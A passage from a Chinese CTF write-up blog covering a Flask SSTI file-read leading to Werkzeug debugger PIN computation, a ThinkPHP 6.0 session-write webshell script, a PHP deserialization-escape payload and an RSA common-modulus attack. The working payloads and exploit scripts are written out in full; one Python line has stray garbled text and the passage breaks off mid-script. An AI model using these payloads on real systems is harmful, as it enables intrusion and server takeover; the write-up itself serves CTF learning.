<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>按照同样的方法进行注入，得到回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu14.png" alt=""><br>然后到<a href="https://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">进制转换网站</a>转换为十进制。</p>
<h4 id="获取机器码"><a href="#获取机器码" class="headerlink" title="获取机器码"></a>获取机器码</h4><p>构造payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>回显如下：<br><img src="http://www.ggb0n.cool/images/ichunqiu15.png" alt=""><br>第一项<code>/docker/</code>后面的字符串即为我们要找的机器码。<br>至此，拿到了生成<code>PIN</code>的所有的要素了，利用下面的脚本生成<code>PIN</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957890'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>然后到题目的链接后面加上<code>/console</code>进入控制面板，输入PIN，获取权限：<br><img src="http://www.ggb0n.cool/images/ichunqiu16.png" alt=""><br>然后就可以随意输入读取文件拿flag了(注意列举文件的时候也可以直接列举根目录的<code>ls /</code>)：<br><img src="http://www.ggb0n.cool/images/ichunqiu17.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu18.png" alt=""></p>
<h2 id="Web-easy-thinking"><a href="#Web-easy-thinking" class="headerlink" title="Web-easy_thinking"></a>Web-easy_thinking</h2><p>考察<code>ThinkPHP6.0</code>存在的通过<code>SESSION</code>写文件的漏洞，同时也考察了对<code>disable_functions</code>的绕过。<br>这一道题比赛的时候知道考察点是SESSION漏洞了，但是由于时间原因当时没有做出来，后来经smity师傅提示，结合getfly师傅的题解，对这道题加深了理解和学习。在BUU上复现了一下。</p>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>由于环境是<code>ThinkPHP6.0</code>，网上查了一下，找到了相关的漏洞文章：<br><a href="https://blog.csdn.net/god_zzZ/article/details/104275241" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/104275241</a><br><a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a><br>就是通过利用<code>SESSION</code>向服务器写入文件，从而拿到shell。</p>
<p>既然是通过SESSION写入文件，我们就需要找到存在SESSION写入的位置，在<code>Member</code>控制器中发现如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!session(<span class="string">'?UID'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/home/member/login'</span>);            </span><br><span class="line">&#125;</span><br><span class="line">$data = input(<span class="string">"post."</span>);</span><br><span class="line">$record = session(<span class="string">"Record"</span>);</span><br><span class="line"><span class="keyword">if</span> (!session(<span class="string">"Record"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    session(<span class="string">"Record"</span>,$data[<span class="string">"key"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，在<code>search</code>方法中可以进行任意SESSION写入，在这个地方我们就可以写入构造好的内容来生成shell，但是首先就需要满足第一个判断，即需要一个现有的SESSION文件并且包含<code>UID</code>字段，下面就需要找到将<code>UID</code>写入SESSION的地方。<br>在<code>Member</code>控制器的<code>login</code>方法中找到如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userId)&#123;</span><br><span class="line">    session(<span class="string">"UID"</span>,$userId);</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/home/member/index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将<code>UID</code>写入SESSION的操作是在判断用户名和密码正确之后的，那么我们就需要先注册一个合法的用户进行登录。</p>
<p>捋一下整个的思路：</p>
<ul>
<li>1、注册一个合法账户</li>
<li>2、利用注册的账户登录时更改<code>SESSION</code>字段的值为<code>xxx.php</code>，并且刚好是32个字符</li>
<li>3、利用相同的<code>SESSION</code>在搜索的时候写入一句话</li>
<li>4、在<code>/runtime/session</code>文件夹下测试一句话，注意是<code>sess_</code>开头的</li>
</ul>
<p>参考getfly师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url_reg = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'</span></span><br><span class="line">url_log = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'</span></span><br><span class="line">url_sea = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'</span></span><br><span class="line">headers = &#123; <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=1234567890123456789012345678.php'</span> &#125;</span><br><span class="line">data1 = &#123;<span class="string">'username'</span>:<span class="string">'ggb0n'</span>, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;</span><br><span class="line">data2 = &#123;<span class="string">'key'</span>:<span class="string">'&lt;?php @eval($_POST["x"]);echo "not flag"; ?&gt;'</span>&#125;</span><br><span class="line">s1 = requests.post(url_reg, data1)</span><br><span class="line">s2 = requests.post(url_log, data1, headers=headers)</span><br><span class="line">s3 = requests.post(url_sea, data2, headers=headers)</span><br><span class="line">test = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php'</span></span><br><span class="line">s = requests.get(test).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'not flag'</span> <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="string">'success'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'failed'</span>)</span><br></pre></td></tr></table></figure>
<p>蚁剑连接小马之后在终端运行<code>/readflag</code>是没用的，利用<code>phpinfo()</code>发现是因为<code>disable_functions</code>把<code>system</code>给ban掉了：<br><img src="http://www.ggb0n.cool/images/ichunqiu28.png" alt=""><br>那就需要绕过限制，smity师傅比赛的时候就提醒需要用<code>php_gc_uaf.php</code>来绕过<code>disable_functhions</code>，一些绕过方法参考<a href="https://blog.csdn.net/jia3643/article/details/104200164" target="_blank" rel="noopener">这里</a>。<br>把<code>php_gc_uaf.php</code>传到一个<code>777</code>权限的文件夹下，然后在浏览器端访问该文件即可拿到flag。</p>
<p>【补充】这个<a href="https://www.exploit-db.com/exploits/48072" target="_blank" rel="noopener">exp</a>不用777权限的文件夹就能执行，web目录即可。高校战“疫”中的PHP-UAF就是用的这个。</p>
<h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><p>考察反序列化逃逸漏洞，这个之前在BUU上刷了<a href="http://47.107.152.5/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia" target="_blank" rel="noopener">一道类似的题目</a>，不过更加复杂，比赛的时候没做出来，看了WP记录学习一下。</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>扫描后台可以发现存在源码<code>www.zip</code>，下载后是四个php文件，我们主要分析与拿flag相关的代码。<br>首先从<code>update.php</code>中发现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，登陆成功之后就可以拿到flag了。</p>
<p>然后审计关键文件<code>lib.php</code>，在其中发现如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这里，就想到了之前在BUU上刷的<strong>[0CTF 2016]piapiapia</strong>，那道题考察的就是反序列化溢出漏洞，这也就是分析的关键了。<br>再往下看，在<code>UpdateHelper</code>类中有一个反序列化点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是从代码中可以看到，此处用户可控的只有<code>Info</code>类中的两个属性<code>age</code>、<code>nickname</code>，不能完全控制序列化数据，无法注入对象。<br>跟进<code>User</code>类中的反序列化点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，反序列化的是<code>getNewinfo()</code>方法获取的内容，再来看一下<code>getNewinfo()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，对<code>Info</code>类的内容序列化之后，会先经过前面提到的<code>safe()</code>函数处理，然后才进行反序列化。<br>这里就是构造反序列化逃逸的地方：通过写入黑名单中的字符\字符串，在经过<code>safe()</code>函数处理的时候会替换为<code>hacker</code>，从而改变了长度，但是序列化的字符串，每一个属性的内容长度都是固定的，从而就可以利用替换关系构造出逃逸，然后注入对象。</p>
<p>整理一下构造pop链的思路：</p>
<blockquote>
<p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把<code>admin</code>账户的密码查出来。</p>
</blockquote>
<p>官方POC如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">0</span>:<span class="string">""</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">8</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"hostname"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"127.0.0.1"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbuser"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbpass"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"database"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"test"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"mysqli"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的是逃逸字符，因此需要保证payload进入之后能保证序列化字符串能够正常反序列化，正常的序列化字符串结构如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>其中的<code>age</code>和<code>nickname</code>是我们可控的，那么我们就可以把payload写入到<code>nickname</code>部分，然后通过将payload挤出去进行逃逸，由于属性是三个，所以我们在<code>nickname</code>中写入的payload前面加一个<code>CtrlCase</code>的属性，在最后加一个<code>}</code>，如此以来，反序列化的时候就会忽略后面的<code>CtrlCase</code>，初步构造payload如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";s:0:"</span><span class="string">";s:8:"</span>nickname<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">";s:6:"</span>dbuse<span class="string">r";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";N;s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>下一步我们就需要把payload逃逸出去：由于payload一共<code>454</code>个字符，因此，我们需要构造黑名单中的内容，通过替换为<code>hacker</code>把payload挤出去，通过<code>safe()</code>函数我们可以知道，一个<code>&#39;</code>替换为<code>hacker</code>可以替换挤出5个字符，一个<code>union</code>替换为<code>hacker</code>可以挤出1个字符，那么在payload前面加上90个<code>&#39;</code>和4个<code>union</code>就可以把454个字符的payload挤出去了，构造最终payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过POST方式，将payload打入<code>update.php</code>即可拿到经过md5加密之后的password，解密即可。<br>本道题是在BUU复现的，密码已经被改为了<code>glzjin</code>了，登录即可拿flag。</p>
<p>补充：smity师傅给了一个很详细的题解，可以好好学学这题：<a href="https://www.anquanke.com/post/id/200200" target="_blank" rel="noopener">这里</a>。</p>
<h2 id="Crypto-Easy-RSA"><a href="#Crypto-Easy-RSA" class="headerlink" title="Crypto-Easy_RSA"></a>Crypto-Easy_RSA</h2><p>考察共模攻击</p>
<h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><p>给的附件内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br></pre></td></tr></table></figure>
<p>这就很明显了，对相同的明文，利用相同的模数<code>n</code>，不同的<code>e</code>进行加密，显然的共模攻击。<br>直接上脚本了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)个字符</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span 